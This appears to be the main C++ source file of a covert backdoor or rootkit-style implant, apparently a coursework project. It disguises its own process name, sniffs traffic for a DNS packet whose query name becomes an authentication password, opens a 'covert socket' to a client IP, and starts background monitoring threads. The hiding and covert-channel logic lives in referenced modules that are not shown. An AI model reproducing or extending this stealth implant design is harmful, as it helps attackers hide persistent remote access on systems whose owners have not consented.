#include <iostream>
#include <zconf.h>
#include "ProcessDistorter.h"
#include "../shared/Logger.h"
#include "../shared/argparcer.h"
#include "TrafficAnalyzer.h"
#include "networkmonitor/NetworkMonitor.h"
#include "SystemState.h"
#include "Time.h"
#include "../shared/PacketIdentifier.h"
#include "../shared/Structures.h"
#include "../shared/Authenticator.h"
#include "covertsocket/CovertSocket.h"
#include "covertsocket/CovertSocketQueue.h"
#include "covertsocket/CovertSocketThread.h"
#include "networkmonitor/NetworkMonitorThread.h"

void * networkMonitorThreadBootstrapper(void * networkMonitorThread){
    NetworkMonitorThread * nmt = (NetworkMonitorThread *)networkMonitorThread;
    nmt->start();
}

string parseOutDNSQuery(PacketMeta meta){

    if(meta.applicationType != ApplicationType::DNS){
        Logger::debug("Main:parseOutDNSQuery - FATAL ERROR. PacketMeta Is Not A DNS Packet");
        return "";
    }

    char * applicationLayer = PacketIdentifier::findApplicationLayer(&meta);
    struct DNS_HEADER * dns = (struct DNS_HEADER * )applicationLayer;

    char * query = applicationLayer + sizeof(struct DNS_HEADER);
    char * ptr = query;

    bool keepProcessing = true;
    string queryName = "";
    bool isFirst = true;
    while(keepProcessing){

        int len = (int)(*ptr);
        //if this is the first one or the last one. don't put a dot
        if(isFirst || len == 0){
            isFirst = false;
        }else{
            queryName += ".";
        }

        if(len == 0){
            break;
        }else{

            ptr++;
            string segment = "";
            for(int i = 0; i < len; ++i){
                char c = (*ptr);
                segment += c;
                ptr++;
            }

            queryName += segment;
        }

    }
    return queryName;
}

int main(int argc, char * argv[]) {

    ArgParcer parcer;
    Logger::setDebug(parcer.TagExists("--DEBUG", argv, argc));
    Logger::debug("Main - Debug Mode Enabled. Parsing Arguments");

    bool useDefaultOnFail = parcer.TagExists("--DOF", argv, argc);
    bool appendHint = parcer.TagExists("--HINT", argv, argc);

    int historyLength = parcer.GetTagVal("-h", argv, argc);
    if(historyLength == -1){
        historyLength = 10;
    }

    string clientIP = parcer.GetTagData("-c", argv, argc);
    if(clientIP.compare("-1")==0){
        Logger::debug("Main - Can't Execute without A Client IP. Aborting");
        return 1;
    }

    //Create ProcessDistorter
    ProcessDistorter * processDistorter = new ProcessDistorter(argv, useDefaultOnFail, appendHint);
    //Execute this immediately to hide process to something
    processDistorter->determineProcessName();

    //Create TrafficAnalyzer
    TrafficAnalyzer * analyzer = new TrafficAnalyzer(historyLength);
    analyzer->setNewTimeSegment();

    Time * time = new Time();
    SystemState * ss = SystemState::getInstance(time);

    //Create NetworkMonitor
    HCrypto * crypto = new HCrypto();
    NetworkMonitor * networkMonitor = NetworkMonitor::getInstance(analyzer, crypto);

    //WE ARE CURRENTLY IN STARTUP MODE
    // 1. Start NetworkMonitor to Listen for DNS
    // 2. Upon Return DNS is All That Will Be In TrafficAnalyzer. Fetch Out This Packet Manually
    // 3. Parse Out Domain In Request -> Set As Authentication Password & Create Crypto with that password
    // 3. Tell CovertSocket To Send. It Will Use TrafficAnalyzer which will give its only Packet
    // 4. Tell SystemState To Do Analyses -> Which Will Set Our New State Out of STARTUP + Time Settings
    // 5. Start Threading For Full Functionality + Time Rules Now Apply

    networkMonitor->listenForTraffic();
    PacketMeta authDNS = analyzer->getLastPacketAdded();
    if(authDNS.applicationType != ApplicationType::DNS){
        Logger::debug("Main - The Application Type Of The Last Packet Is Not DNS. Fatal Error. Aborting");

        delete(processDistorter);
        delete(analyzer);
        delete(ss);
        delete(networkMonitor);
        delete(crypto);

        return 1;
    }

    string dnsQuery = parseOutDNSQuery(authDNS);
    Logger::debug("Main - Acquired DNS Query Name. This Will Be Our Password: >" + dnsQuery + "<");

    Authenticator::setPassword(dnsQuery);
    crypto->initialize(dnsQuery);

    CovertSocket * covertSocket = new CovertSocket(analyzer, crypto, time, clientIP);
    covertSocket->send(dnsQuery);

    //WE ARE NOW IN FULL FUNCTIONALITY MODE


    //create pthread for NetworkMonitor
    //create pthread for CovertSocket
    //create pthread for FileSystemManager ?
    //create pthread for ProcessDistorter

    SystemState::currentState = SystemState::MEDIUM;

    Logger::debug("Main - Creating NetworkMonitoring Thread. Starting...");
    NetworkMonitorThread * networkMonitorThread = new NetworkMonitorThread(networkMonitor);
    pthread_t nmt;
    pthread_create(&nmt, NULL, &networkMonitorThreadBootstrapper, networkMonitorThread);

    Logger::debug("Main - NetworkMonitorThread Launched");

    while(1){

    }


    //CovertSocketQueue * covertSocketQueue = new CovertSocketQueue();
    //CovertSocketThread * covertSocketThread = new CovertSocketThread(covertSocketQueue, covertSocket);






    // - Pass TrafficAnalyzer

    //Create CovertSocket
    // - Pass TrafficAnalyzer

    //Create SystemState
    //Register All Components To SystemState

    //Manually set SystemState to 'FullCaution Mode'
    //Start SystemState Analysis

    //Start SystemState Looping


    //cleanup when we close
    delete(processDistorter);
    delete(analyzer);
    delete(ss);
    delete(networkMonitor);
    delete(crypto);

    return 0;

}